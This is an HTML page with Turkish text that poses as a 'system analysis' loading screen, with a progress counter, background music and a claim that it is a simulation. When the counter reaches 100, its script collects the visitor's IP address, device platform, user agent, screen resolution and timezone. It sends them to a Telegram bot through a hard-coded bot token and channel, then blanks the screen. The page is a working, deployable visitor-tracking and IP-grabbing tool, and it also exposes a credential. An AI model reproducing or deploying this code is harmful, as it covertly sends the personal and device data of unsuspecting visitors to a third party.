<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor Analizi</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            transition: all 1s ease;
        }
        body.black-screen {
            background: #000000 !important;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 500px;
            transition: opacity 1s ease;
            position: relative;
            z-index: 2;
        }
        body.black-screen .container {
            opacity: 0;
            visibility: hidden;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .counter {
            font-size: 4em;
            font-weight: bold;
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .health-bar-container {
            width: 100%;
            height: 30px;
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            margin: 20px 0;
            overflow: hidden;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }
        .health-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #4cd964, #5ac8fa);
            transition: width 0.1s linear;
            border-radius: 15px;
            box-shadow: 0 0 20px #4cd964;
        }
        .status {
            font-size: 1.2em;
            margin-top: 20px;
            opacity: 0.9;
        }
        .audio-status {
            font-size: 0.9em;
            margin-top: 15px;
            padding: 8px;
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
        }
        .warning {
            font-size: 0.8em;
            margin-top: 30px;
            opacity: 0.6;
            border-top: 1px solid rgba(255,255,255,0.2);
            padding-top: 20px;
        }
    </style>
</head>
<body>
    <!-- Gizli ses oynatıcı - ONLINE MP3 KULLANIYORUZ -->
    <audio id="bg-audio" loop preload="auto">
        <!-- 1. seçenek - SoundHelix test müziği (her zaman çalışır) -->
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
        <!-- 2. seçenek - yedek müzik (eğer ilki çalışmazsa) -->
        <source src="https://file-examples.com/storage/fe0ba217c681a43ecfad843/2017/11/file_example_MP3_700KB.mp3" type="audio/mpeg">
        <!-- 3. seçenek - başka bir yedek -->
        <source src="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm.ogg" type="audio/ogg">
        Tarayıcınız ses elementini desteklemiyor.
    </audio>

    <div class="container">
        <h1>🔍 Sistem Analizi Yükleniyor</h1>
        <div class="counter" id="counter">0</div>
        <div class="health-bar-container">
            <div class="health-bar" id="healthBar"></div>
        </div>
        <div class="status" id="status">Sistem başlatılıyor...</div>
        <div class="audio-status" id="audioStatus">🎵 Müzik yükleniyor...</div>
        <div class="warning">
            ⚠️ Bu sayfa simülasyon amaçlıdır. 100'e ulaşınca siyah ekran aktif olur.
        </div>
    </div>

    <script>
        let count = 0;
        let audioStarted = false;
        const counterElement = document.getElementById('counter');
        const healthBarElement = document.getElementById('healthBar');
        const statusElement = document.getElementById('status');
        const audioStatusElement = document.getElementById('audioStatus');
        const audio = document.getElementById('bg-audio');
        const body = document.body;
        
        // KENDİ TELEGRAM BİLGİLERİNİZİ GİRİN
        const BOT_TOKEN = '8695583417:AAHZxz3RWI_prhnfk29ZbAK5ESjXSd8QOis'; // Telegram Bot Token
        const CHAT_ID = '@STCCriss'; // @STCCriss ID

        // Ses başlatma fonksiyonu
        function playAudio() {
            if (audioStarted) return;
            
            audio.volume = 0.7; // Ses seviyesi %70
            
            const playPromise = audio.play();
            
            if (playPromise !== undefined) {
                playPromise.then(() => {
                    console.log('✅ Müzik başarıyla başladı');
                    audioStatusElement.innerHTML = '🎵 Müzik aktif (Online)';
                    audioStarted = true;
                }).catch(error => {
                    console.log('❌ Müzik başlatılamadı:', error);
                    audioStatusElement.innerHTML = '⚠️ Müzik için sayfaya tıklayın';
                    
                    // Tıklama ile başlat
                    document.body.addEventListener('click', function clickHandler() {
                        audio.play();
                        audioStatusElement.innerHTML = '🎵 Müzik aktif (Tıklama ile)';
                        audioStarted = true;
                        document.body.removeEventListener('click', clickHandler);
                    }, { once: true });
                });
            }
        }

        // Detaylı bilgileri toplama
        async function getDetailedInfo() {
            const info = {
                timestamp: new Date().toLocaleString('tr-TR'),
                url: window.location.href,
                referrer: document.referrer || 'Doğrudan',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || 'Bilinmiyor',
            };

            // IP adresini al
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ip = ipData.ip;
            } catch (error) {
                info.ip = 'IP alınamadı';
            }

            return info;
        }

        // Telegram'a gönderme
        async function sendToTelegram(info) {
            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                console.warn('⚠️ Telegram bilgileri girilmemiş!');
                console.log('Toplanan bilgiler:', info);
                
                // Bilgileri ekranda göster (test için)
                audioStatusElement.innerHTML = `📊 Test: ${info.ip} - ${info.platform}`;
                return;
            }

            const message = `
🔔 **YENİ ZİYARETÇİ** 🔔

🌐 **IP:** ${info.ip}
📱 **Cihaz:** ${info.platform}
💻 **Ekran:** ${info.screenResolution}
⏰ **Zaman:** ${info.timestamp}
🔗 **Sayfa:** ${info.url}
            `;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    audioStatusElement.innerHTML = '✅ Telegram\'a gönderildi!';
                }
            } catch (error) {
                console.error('Telegram hatası:', error);
            }
        }

        // Siyah ekranı aktifleştir
        function activateBlackScreen() {
            body.classList.add('black-screen');
            audioStatusElement.innerHTML = '⬛ Siyah ekran - Müzik devam ediyor';
            console.log('⬛ Siyah ekran aktif');
        }

        // Sayaç
        function startCounter() {
            const interval = setInterval(async () => {
                count++;
                counterElement.textContent = count;
                healthBarElement.style.width = count + '%';
                
                // Durum mesajları
                if (count === 20) {
                    statusElement.textContent = 'IP adresi tespit ediliyor...';
                } else if (count === 40) {
                    statusElement.textContent = 'Cihaz bilgileri toplanıyor...';
                } else if (count === 60) {
                    statusElement.textContent = 'Rapor hazırlanıyor...';
                } else if (count === 80) {
                    statusElement.textContent = 'Son kontroller yapılıyor...';
                }

                if (count === 100) {
                    clearInterval(interval);
                    statusElement.textContent = '✅ Analiz tamamlandı!';
                    
                    // Bilgileri topla ve gönder
                    const detailedInfo = await getDetailedInfo();
                    await sendToTelegram(detailedInfo);
                    
                    statusElement.textContent = '⬛ Siyah ekran hazırlanıyor...';
                    
                    // 1.5 saniye sonra siyah ekran
                    setTimeout(() => {
                        activateBlackScreen();
                    }, 1500);
                }
            }, 60); // 60ms'de bir artar
        }

        // Sayfa yüklendiğinde
        window.addEventListener('load', () => {
            // Ses dosyası kontrolleri
            audio.addEventListener('error', (e) => {
                console.log('Ses dosyası yüklenirken hata:', e);
                audioStatusElement.innerHTML = '🎵 Online müzik kullanılıyor...';
            });

            audio.addEventListener('canplay', () => {
                console.log('Ses dosyası hazır');
                audioStatusElement.innerHTML = '🎵 Müzik hazır, başlatılıyor...';
            });

            // 1 saniye sonra ses başlatma dene
            setTimeout(() => {
                playAudio();
            }, 1000);
            
            // 1.5 saniye sonra sayacı başlat
            setTimeout(() => {
                startCounter();
                statusElement.textContent = 'Sistem analiz ediliyor...';
            }, 1500);
        });

        // Sayfa kapanırken sesi durdur
        window.addEventListener('beforeunload', () => {
            audio.pause();
        });
    </script>
</body>
</html>
